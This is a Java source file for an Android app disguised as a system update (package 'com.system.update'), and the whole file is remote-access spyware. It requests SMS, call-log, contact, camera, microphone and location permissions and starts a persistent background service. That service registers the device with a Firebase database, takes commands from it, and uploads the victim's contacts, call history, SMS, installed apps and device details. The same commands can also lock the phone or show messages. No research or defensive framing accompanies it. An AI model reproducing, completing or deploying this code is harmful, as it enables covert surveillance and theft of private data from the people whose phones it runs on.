package com.system.update;

import android.Manifest;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);

        // تشغيل الخدمة فوراً
        startService(new Intent(this, FirebaseService.class));
        statusText.setText("✅ التطبيق يعمل في الخلفية");

        activateBtn.setOnClickListener(v -> requestAllPermissions());
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }
        Toast.makeText(this, "✅ كل الأذونات مفعّلة", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل في الخلفية");
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) {
            statusText.setText("✅ التطبيق يعمل في الخلفية");
            Toast.makeText(this, "✅ التطبيق جاهز", Toast.LENGTH_LONG).show();
        }
    }

    public static class FirebaseService extends Service {
        private DatabaseReference deviceRef, commandsRef;
        private String deviceId;

        @Override
        public void onCreate() {
            super.onCreate();
            deviceId = getDeviceId(this);
            FirebaseDatabase db = FirebaseDatabase.getInstance();
            deviceRef = db.getReference("devices").child(deviceId);
            commandsRef = db.getReference("commands").child(deviceId);
            registerDevice();
            listenCommands();
        }

        private String getDeviceId(Context c) {
            android.content.SharedPreferences sp = c.getSharedPreferences("dev", MODE_PRIVATE);
            String id = sp.getString("id", null);
            if (id == null) {
                id = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
                sp.edit().putString("id", id).apply();
            }
            return id;
        }

        private void registerDevice() {
            Map<String, Object> info = new HashMap<>();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdkInt", Build.VERSION.SDK_INT);
            info.put("deviceId", deviceId);
            info.put("status", "online");
            info.put("lastSeen", System.currentTimeMillis());
            deviceRef.setValue(info);
            deviceRef.child("status").onDisconnect().setValue("offline");
        }

        private void listenCommands() {
            commandsRef.addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(@NonNull DataSnapshot s, @Nullable String p) {
                    Map<String, Object> cmd = (Map<String, Object>) s.getValue();
                    if (cmd != null) exec(cmd);
                    s.getRef().removeValue();
                }
                @Override public void onChildChanged(@NonNull DataSnapshot s, @Nullable String p) {}
                @Override public void onChildRemoved(@NonNull DataSnapshot s) {}
                @Override public void onChildMoved(@NonNull DataSnapshot s, @Nullable String p) {}
                @Override public void onCancelled(@NonNull DatabaseError e) {}
            });
        }

        private void exec(Map<String, Object> cmd) {
            String type = (String) cmd.get("type");
            if (type == null) return;
            DatabaseReference dataRef = FirebaseDatabase.getInstance().getReference("data").child(deviceId);
            try {
                switch (type) {
                    case "vibrate": {
                        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                        long d = 1000;
                        Object dur = cmd.get("duration");
                        if (dur instanceof Number) d = ((Number) dur).longValue();
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            v.vibrate(VibrationEffect.createOneShot(d, VibrationEffect.DEFAULT_AMPLITUDE));
                        else v.vibrate(d);
                        break;
                    }
                    case "show_toast": {
                        String m = (String) cmd.get("message");
                        Toast.makeText(this, m == null ? "" : m, Toast.LENGTH_LONG).show();
                        break;
                    }
                    case "torch_on": {
                        try {
                            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
                            cm.setTorchMode(cm.getCameraIdList()[0], true);
                        } catch (Exception e) {}
                        break;
                    }
                    case "torch_off": {
                        try {
                            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
                            cm.setTorchMode(cm.getCameraIdList()[0], false);
                        } catch (Exception e) {}
                        break;
                    }
                    case "lock": {
                        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminReceiver.class);
                        if (dpm.isAdminActive(admin)) dpm.lockNow();
                        break;
                    }
                    case "get_contacts": Helpers.pushContacts(this, dataRef); break;
                    case "get_call_log": Helpers.pushCalls(this, dataRef); break;
                    case "get_sms_log": Helpers.pushSms(this, dataRef); break;
                    case "get_installed_apps": Helpers.pushApps(this, dataRef); break;
                    case "get_system_info": Helpers.pushSystem(this, dataRef); break;
                    default: Log.d("CMD", "Unknown: " + type);
                }
            } catch (Exception e) {
                Map<String, Object> err = new HashMap<>();
                err.put("command", type);
                err.put("error", e.getMessage());
                dataRef.child("errors").push().setValue(err);
            }
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            return START_STICKY;
        }

        @Nullable
        @Override
        public IBinder onBind(Intent intent) { return null; }
    }
    }
